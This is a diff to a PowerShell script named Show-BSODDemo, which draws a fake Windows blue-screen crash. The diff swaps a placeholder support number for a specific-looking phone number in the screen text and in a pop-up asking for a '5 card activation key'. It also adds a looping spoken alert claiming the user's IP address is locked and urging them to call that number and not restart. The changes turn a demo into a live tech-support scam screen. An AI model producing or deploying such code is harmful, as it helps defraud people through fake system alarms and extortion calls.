@@ -60,7 +60,7 @@ PS> Show-BSODDemo
 	$form.Controls.Add($ipLabel)
 
 	$contactLabel = New-Object System.Windows.Forms.Label
-	$contactLabel.Text = "Contact Support: +1-888-888-8888"
+	$contactLabel.Text = "Contact Support: +1-(507)-291-5455"
 	$contactLabel.Font = New-Object System.Drawing.Font('Segoe UI Semibold', 24, [System.Drawing.FontStyle]::Regular)
 	$contactLabel.ForeColor = [System.Drawing.Color]::Red
 	$contactLabel.AutoSize = $true
@@ -111,7 +111,7 @@ PS> Show-BSODDemo
 	}
 
 	$qrText = New-Object System.Windows.Forms.Label
-	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +1-888-888-8888"
+	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +1-507-291-5455"
 	$qrText.Font = New-Object System.Drawing.Font('Segoe UI Light', 13, [System.Drawing.FontStyle]::Regular)
 	$qrText.ForeColor = [System.Drawing.Color]::White
 	$qrText.AutoSize = $true
@@ -209,7 +209,7 @@ PS> Show-BSODDemo
 	$popup.Controls.Add($popupTitle)
 
 	$popupText = New-Object System.Windows.Forms.Label
-	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +1-888-888-8888"
+	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +1-507-291-5455"
 	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 12)
 	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
 	$popupText.BackColor = $popup.BackColor
@@ -316,6 +316,7 @@ PS> Show-BSODDemo
 	$script:ttsEnabled = $false
 	$script:audioFallbackTimer = $null
 
+	$spokenText = "Critical Alert. Warning, Your IP Address is Locked. Please contact support immediately at 1 5 0 7, 2 9 1, 5 4 5 5. Do not restart your computer."
 	try {
 		$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
 		$installedVoices = $synth.GetInstalledVoices()
@@ -330,10 +331,10 @@ PS> Show-BSODDemo
 				$script:ttsEnabled = $true
 				$script:tts.SpeakCompleted += {
 					if ($script:ttsEnabled -and $script:tts -ne $null) {
-						$script:tts.SpeakAsync($mainText)
+						$script:tts.SpeakAsync($spokenText)
 					}
 				}
-				$script:tts.SpeakAsync($mainText) | Out-Null
+				$script:tts.SpeakAsync($spokenText) | Out-Null
 			}
 		}
 	} catch {
